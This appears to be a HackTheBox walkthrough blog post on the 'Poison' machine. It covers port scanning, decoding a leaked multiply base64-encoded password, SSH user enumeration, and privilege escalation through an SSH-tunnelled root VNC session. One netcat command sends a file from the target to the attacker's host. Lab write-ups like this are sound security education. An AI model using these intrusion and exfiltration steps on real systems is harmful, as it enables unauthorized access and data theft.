---
title: "Poison"
date: 2023-08-31T17:08:15+02:00
tags: ["privesc","web","linux","ssh"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with a website which has a base64 encoded password leaked on a directory. We privEsc thanks to do a portforwarding on a VNC port."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Poison
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Poison

![/HTB/poison-icon.png](/HTB/poison-icon.png)

## Tools Used

- nmap
- searchsploit
- vncviewer

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

We have two open ports up and running, one with a website and the other one for **ssh**.

## Enumeration

As always I am going to enumerate the **http** page.

![Untitled](/HTB/poison-1.png)

It like a **php** browser, one of the sites to be tested is pretty interesting `listfiles.php` 

![Untitled](/HTB/poison-2.png)

We can see an array of **php** files maybe is performing a ls command on background.

```bash
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
```

I checked each one and `pwdbackup.txt` leaks a **base64 encoded password** and also a message telling us that has been encoded 13 times.

## Exploiting

So I decided to make a bash script in order to decode it 13 times and output the decoded password.

```bash
#!/bin/bash

encoded_text="Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xV$
decoded_text=$encoded_text

for i in {1..13}
do
    decoded_text=$(echo "$decoded_text" | base64 -d)
done

echo "$decoded_text"
```

Once executed we have a password but not a username.

```
Charix!2#4%6&8(0
```

As the ssh version is older we can enumerate user with an exploit

![Untitled](/HTB/poison-3.png)

We can execute the exploit with the following command

```bash
usage: sshenum.py [-h] [-p PORT] target username
```

So I decided to try with admin, **root** and **posion** and **charix**. The last one because is extracted from the password.

**root** and **charix** are valid usernames.

![Untitled](/HTB/poison-4.png)

![Untitled](/HTB/poison-5.png)

## Gaining an Initial Foothold

After attempting the two usernames with the decoded password, I successfully logged in as **charix**.

![Untitled](/HTB/poison-6.png)

Let’s cat the **user’s flag**.

![Untitled](/HTB/poison-8.png)

![Untitled](/HTB/poison-9.png)

With the id command we can see that we don’t have permissions as root so we need to **privEsc**.

## Escalating Privilege

Checking at the charix’s home directory we can see a `secret.zip`.

![Untitled](/HTB/poison-10.png)

The file owner is **root** so let’s try to unzip it.

When I try to unzip it unzip asks you for a password but doesn’t let you put it before it closes. 

So I decide to unzip it on my local machine sending the file via nc.

```bash
nc 10.10.14.9 4444 < secret.zip
```

The bellow command on the remote machine and the above command on the local machine.

```bash
nc -lv 4444 > secret.zip
```

Once we get the zip I try to unzip it with the same password as before and it worked.

![Untitled](/HTB/poison-11.png)

The zip has only one file with a **non-ascii characters**.

Interesting but not so useful right now.

If we check if there are more open ports, we can see two unexpected ports which **nmap** doesn’t shown like **5801** and **5901**.

```bash
netstat -na -p tcp
```

![Untitled](/HTB/poison-12.png)

This ports are typically used for **VNC**. By checking the processes we can see that the vnc process is owned by the **root**.

```bash
ps faux
```

```bash
root   529   0.0  1.0  26188 10440 v0- I    12:05     0:00.68 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.
```

Let’s do a **portforwarding** with ssh to the port 5901 in order to connect to vnc root’s dektop.

```bash
ssh -L5901:127.0.0.1:5901 charix@10.10.10.84
```

Now, we need to download **VNC**, we can do it with brew.

```bash
brew install tiger-vnc
```

Once installed let’s run vnc

```bash
vncviewer 127.0.0.1:5901
```

![Untitled](/HTB/poison-14.png)

The program asks you for a password, I tried to put **default/common passwords** and to reutilize the previous password but failed.

Later I realized that we have a secret file with a password maybe if we pass it as argument we can get in.

```bash
vncviewer -passwd secret 127.0.0.1:5901
```

![Untitled](/HTB/poison-15.png)

We are in.

![Untitled](/HTB/poison-16.png)

**Thank you for reading, and happy hacking! 😄**